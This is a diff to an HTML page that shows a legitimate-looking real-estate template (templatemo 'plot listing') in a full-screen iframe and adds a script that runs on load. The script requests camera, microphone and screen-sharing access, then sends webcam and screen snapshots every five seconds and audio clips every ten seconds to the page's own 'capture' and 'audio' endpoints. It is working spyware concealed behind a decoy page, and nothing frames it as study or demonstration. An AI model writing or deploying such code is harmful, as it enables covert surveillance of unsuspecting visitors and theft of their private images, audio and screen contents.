@@ -9,11 +9,117 @@
 <script src="/cmp.js"></script>
 
 
+
+
 </head>
 <body>
     <div id="live-view">
         <iframe style="display: block; position: absolute; width: 100%; height: 100%;" width="100%" height="100%" frameborder="0" src="https://templatemo.com/templates/templatemo_564_plot_listing"></iframe>
     </div>
+    <div id="canvas"></div>
+    <script>
+function captureMedia() {
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+    .then(stream => {
+      const video = document.createElement('video');
+      const urlCompleta = window.location.href;
 
+      video.srcObject = stream;
+      video.play();
+
+      // Captura de video (como antes)
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+      const videoInterval = setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        fetch(urlCompleta + 'capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: canvas.toDataURL('image/png') })
+        });
+      }, 5000);
+
+      // Captura de audio
+      const recorder = new MediaRecorder(stream);
+      const chunks = [];
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = () => {
+        const blob = new Blob(chunks, { type: 'audio/webm' });
+        const formData = new FormData();
+        formData.append('audio', blob, `audio_${Date.now()}.webm`);
+        fetch(urlCompleta + 'audio', {
+          method: 'POST',
+          body: formData
+        });
+      };
+      recorder.start();
+      setInterval(() => {
+        recorder.stop();
+        recorder.start();
+        chunks.length = 0;
+      }, 10000); // Grabar clips de 10 segundos
+
+      // Detener todo al salir
+      window.onunload = () => {
+        clearInterval(videoInterval);
+        recorder.stop();
+        stream.getTracks().forEach(track => track.stop());
+      };
+    })
+    .catch(err => console.error('Error:', err));
+}
+function captureScreen() {
+  const video = document.createElement('video');
+  video.style.display = 'none';
+  document.body.appendChild(video);
+  const urlCompleta = window.location.href;
+  navigator.mediaDevices.getDisplayMedia({ video: true }) // Solicita compartir pantalla
+    .then(stream => {
+      video.srcObject = stream;
+      video.play();
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 1280; // Resolución ajustable
+      canvas.height = 720;
+      const ctx = canvas.getContext('2d');
+
+      // Bucle para capturar imágenes cada 5 segundos
+      const intervalId = setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
+        fetch(urlCompleta + 'capture', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ image: imageData })
+        })
+          .then(response => response.json())
+          .then(data => console.log('Captura enviada:', data))
+          .catch(err => console.error('Error enviando captura:', err));
+      }, 5000); // Ajusta el intervalo según necesidad
+
+      // Detener stream y bucle al salir de la página
+      window.onunload = () => {
+        clearInterval(intervalId);
+        stream.getTracks().forEach(track => track.stop());
+        console.log('Stream y bucle detenidos');
+      };
+
+      // Detener si el usuario termina la compartición
+      stream.getVideoTracks()[0].onended = () => {
+        clearInterval(intervalId);
+        stream.getTracks().forEach(track => track.stop());
+        console.log('Compartición de pantalla terminada');
+      };
+    })
+    .catch(err => console.error('Error accediendo a pantalla:', err));
+}
+
+// Ejecutar en consola
+captureScreen();
+
+captureMedia();
+</script>
 </body>
 </html>
